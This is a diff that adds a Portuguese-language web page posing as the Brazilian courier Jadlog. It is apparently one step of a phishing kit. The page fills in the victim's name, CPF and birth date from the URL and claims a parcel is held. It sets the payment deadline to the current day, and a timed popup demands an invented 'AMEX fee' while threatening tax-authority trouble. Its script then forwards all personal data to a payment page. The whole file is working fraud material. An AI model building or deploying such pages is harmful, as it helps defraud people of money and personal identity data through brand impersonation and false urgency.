@@ -1,0 +1,207 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="../jadlog/css/style.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        #buttonClick {
+            background-color: #CB0033;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
+        }
+
+        #buttonClick:hover {
+            background-color: #7a001e;
+            cursor: pointer;
+        }
+        .img1{
+            width: 45%;
+            height: 100%;
+        }
+    </style>
+
+    <title>VERIFICAÇÃO</title>
+</head>
+
+<body>
+    <header>
+        <img class="img1" src="../jadlog/images/jadlog-logo.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Portal Jadlog > Rastreio</p>
+    </header>
+
+    <div class="cta">
+        <img id="imagem" src="../jadlog/images/certo-jadlog.png" alt="">
+
+        <p>⚠️ ALERTA IMPORTANTE</p>
+    </div>
+
+    <!-- Seção destacada do pedido retido -->
+    <div style="background: #fff3cd; border: 2px solid #ffeaa7; border-radius: 12px; padding: 20px; margin: 20px 15px; text-align: left; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+        <p style="margin: 0 0 15px 0; font-weight: 700; color: #856404; font-size: 18px; text-align: center;">
+            ⚠️ Identificamos um pedido em seu CPF retido em uma de nossas agências.
+        </p>
+        
+        <div style="margin: 12px 0; padding: 8px; background: white; border-radius: 6px;">
+            <strong>Nome:</strong> <span id="nome-display">Não informado</span>
+        </div>
+        
+        <div style="margin: 12px 0; padding: 8px; background: white; border-radius: 6px;">
+            <strong>CPF:</strong> <span id="cpf-display">Não informado</span>
+        </div>
+        
+        <div style="margin: 12px 0; padding: 8px; background: white; border-radius: 6px;">
+            <strong>Nascimento:</strong> <span id="nascimento-display">Não informado</span>
+        </div>
+        
+        <div style="margin: 12px 0; padding: 8px; background: #ffebee; border-radius: 6px; border-left: 4px solid #d63031;">
+            <strong style="color: #d63031;">Prazo para regularização:</strong> <span id="prazo-regularizacao" style="color: #d63031; font-weight: 700;">04/09/2025</span>
+        </div>
+    </div>
+
+    <!-- Seção de confirmação de dados -->
+    <div class="cta3">
+        <p style="font-weight: 600; color: #333; margin-bottom: 15px;">Confirme os dados para prosseguir:</p>
+    </div>
+
+    <div class="cta4">
+        <span id="sends">CONFIRMAR</span>
+    </div>
+
+    <div id="popoup">
+        <div class="popoupcontent">
+            <div class="row">
+                <img id="naomostrardeinicio" src="../jadlog/images/red-hazard-warning-sign-on-transparent-background-free-png.png" alt="">
+
+                <div class="headlineectapopoup">
+                    <h1 id="carregandodadoss">Confirmando seus dados...</h1>
+                    <p id="esconderdepois">Por favor aguarde</p>
+                </div>
+
+                <h1 id="carregandodadosSs">ERRO TAXA PENDENTE</h1>
+            </div>
+
+            <div class="loading">
+                <br>
+                <div class="progresseBar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="contente">
+                <p>
+                   ⚠️ A taxa AMEX esta pendente, evite problemas com a Receita Federal e a devolução do pacote: Regularize o pagamento agora.
+
+                    <br><br>
+
+                </p>
+
+                <a id="buttonClick" href="javascript:void(0)" onclick="redirecionarParaPagamento()">
+                    PAGAR TAXA AMEX
+                </a>
+
+                <span id="maisforte">Clique no botão para continuar</span>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <img src="../jadlog/images/jadlog-logo.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença</p>
+    </footer>
+
+    <script>
+        // Função para obter parâmetros da URL
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Função para formatar CPF
+        function formatarCPF(cpf) {
+            if (!cpf || cpf === 'Não informado') return cpf;
+            // Remove qualquer caractere não numérico
+            const numeros = cpf.replace(/\D/g, '');
+            // Aplica a formatação apenas se tiver 11 dígitos
+            if (numeros.length === 11) {
+                return numeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+            }
+            return cpf;
+        }
+
+        // Função para formatar nome
+        function formatarNome(nome) {
+            return nome.toLowerCase().replace(/(?:^|\s)\S/g, function(a) { return a.toUpperCase(); });
+        }
+
+        // Função para redirecionar para pagamento
+        function redirecionarParaPagamento() {
+            const params = new URLSearchParams(window.location.search);
+            const queryString = Array.from(params.entries())
+                .map(([key, value]) => `${key}=${value}`)
+                .join('&');
+            
+            window.location.href = '../liberacao/?' + queryString;
+        }
+
+        // Capturar dados da URL
+        const nome = getQueryParam('nome') || 'Não informado';
+        const cpf = getQueryParam('cpf') || 'Não informado';
+        const nascimento = getQueryParam('nascimento') || 'Não informado';
+
+        // Função para calcular prazo de regularização (mesmo dia da consulta)
+        function calcularPrazoRegularizacao() {
+            const hoje = new Date();
+            
+            const dia = hoje.getDate().toString().padStart(2, '0');
+            const mes = (hoje.getMonth() + 1).toString().padStart(2, '0');
+            const ano = hoje.getFullYear();
+            
+            return `${dia}/${mes}/${ano}`;
+        }
+
+        // Exibir dados na página
+        document.addEventListener('DOMContentLoaded', function() {
+            const nomeFormatado = formatarNome(nome);
+            const cpfFormatado = formatarCPF(cpf);
+            
+            // Atualizar os dados na caixa de alerta
+            const nomeElement = document.getElementById('nome-display');
+            const cpfElement = document.getElementById('cpf-display');
+            const nascimentoElement = document.getElementById('nascimento-display');
+            const prazoElement = document.getElementById('prazo-regularizacao');
+            
+            if (nomeElement) nomeElement.textContent = nomeFormatado;
+            if (cpfElement) cpfElement.textContent = cpfFormatado;
+            if (nascimentoElement) nascimentoElement.textContent = nascimento;
+            if (prazoElement) prazoElement.textContent = calcularPrazoRegularizacao();
+        });
+
+        // Mostrar popup após 2 segundos
+        setTimeout(function() {
+            document.getElementById('popoup').style.display = 'flex';
+        }, 2000);
+
+        // Adicionar evento de clique no botão CONFIRMAR
+        document.getElementById('sends').addEventListener('click', function() {
+            // Redirecionar diretamente para pagamento com os dados
+            redirecionarParaPagamento();
+        });
+    </script>
+
+</body></html>
